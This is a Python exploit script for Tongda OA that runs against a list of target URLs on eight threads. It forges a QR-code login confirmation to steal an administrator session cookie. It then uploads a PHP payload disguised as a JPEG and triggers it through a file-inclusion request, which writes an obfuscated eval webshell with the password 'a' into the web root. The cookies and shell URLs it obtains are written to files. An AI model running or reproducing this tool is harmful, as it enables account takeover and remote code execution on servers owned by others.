import json
import base64
import urllib3
import requests
import functools
import threadpool

urllib3.disable_warnings()
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}
# debug
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


# global settings
def modified_session():
    s = requests.Session()
    s.request = functools.partial(s.request, headers=headers, verify=False, timeout=15)
    return s


def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")
        return vurl


def get_cookie(url):

    session = modified_session()
    try:
        r1 = session.get(url + "/ispirit/login_code.php")
        if r1.status_code == 200 and "codeuid" in r1.text: 
            codeUid = json.loads(r1.text)["codeuid"]
        else:
            r1 = session.get(url + "/general/login_code.php")
            status = r1.text.find('{"status":1')
            if r1.status_code == 200 and status != -1:
                codeUid = json.loads(r1.text[status:])["code_uid"]
            else:
                return
        data = {"codeuid": codeUid, "uid": int(1), "source": "pc", "type": "confirm", "username": "admin"}
        r2 = session.post(url + "/general/login_code_scan.php", data=data)
        if r2.status_code == 200 and json.loads(r2.text)["status"] == "1":
            r3 = session.get(url + "/ispirit/login_code_check.php?codeuid=" + codeUid)
            if r3.status_code == 200 and '"uid":"1"' in r3.text:
                return r3.headers["Set-Cookie"]
    except:
        pass
    return


def exp(url):
    shellName = "templates.php"
    tongdaDir = "/"
    uploadFlag = "upload jpg shell"
    shellFlag = "sucess !!"

    b64Shell = "PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJhIl07ZXZhbCgiIi4kYik7ZWNobyAi" + base64.b64encode(shellFlag.encode("utf-8")).decode("utf-8") + "Ijs/Pg=="
    # password:a
    # POST method
    # base64.decode: <?php $a="~+d()"^"!{+{}";$b=${$a}["a"];eval("".$b);echo "sucess !!";?>

    printFlag = ""
    cookieDict = {"PHPSESSID": "no_cookie"}
    cookie = get_cookie(url)
    # if get cookie failed, then try to upload shell without authentication. For more details: https://github.com/jas502n/oa-tongda-rce
    if cookie:         
        cookieDict = dict([l.split("=", 1) for l in cookie.split("; ")])
        loginCookie = "%s/general/index.php\t%s" % (url, cookie)
        printFlag = "[Login]：" + loginCookie + "\n"
        wirte_targets(loginCookie, "cookie.txt")
    session = modified_session()
    requests.utils.add_dict_to_cookiejar(session.cookies, cookieDict)
    UploadData = {"UPLOAD_MODE": "1", "P": cookieDict["PHPSESSID"], "DEST_UID": "1"}
    uploadShellContents = "<?php\r\nfile_put_contents($_SERVER[\"DOCUMENT_ROOT\"].\"/%s\", base64_decode('%s'));\r\necho \"%s\";\r\n?>" % (tongdaDir + shellName, b64Shell, uploadFlag)
    files = {"ATTACHMENT": ("jpg", uploadShellContents, "image/jpeg")}
    try:
        r1 = session.post(url + "/ispirit/im/upload.php", data=UploadData, files=files, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"})
        text = r1.text
        if r1.status_code == 200 and "[vm]" in text:
            uploadFilePath = text[text.find('@')+1:text.find('|')].replace('_', '/')
            # need more tests here
            includeData = 'json={"url":"/general/../../attach/im/' + uploadFilePath + '.jpg"}'
            r2 = session.post(url + "/mac/gateway.php", data=includeData)
            if r2.status_code == 404 or uploadFlag not in r2.text:
                r2 = session.post(url + "/ispirit/interface/gateway.php", data=includeData)
            if r2.status_code == 200 and uploadFlag in r2.text:
                shellPath = url + tongdaDir + shellName
                r3 = session.get(shellPath)
                if shellFlag in r3.text:
                    printFlag = "[Getshell]：%s\t%s\n" % (shellPath, cookie)
                    wirte_targets(shellPath, "shell.txt")
    except:
        pass
    print(printFlag, end='')


def multithreading(funcname, params, filename, pools):
    works = []
    with open(filename, 'r') as f:
        for i in f:
            func_params = [i.rstrip("\n")] + params
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()


def main():
    urlList = "url.txt"
    extraParams = []
    threads = 8
    multithreading(exp, extraParams, urlList, threads)


if __name__ == "__main__":
    main()

# Usage: python tongda.py
#   url.txt:      URL list
# Default webshell password:a
# Result:
#   shell.txt:    uploaded webshell
#   cookie.txt:   valid login cookie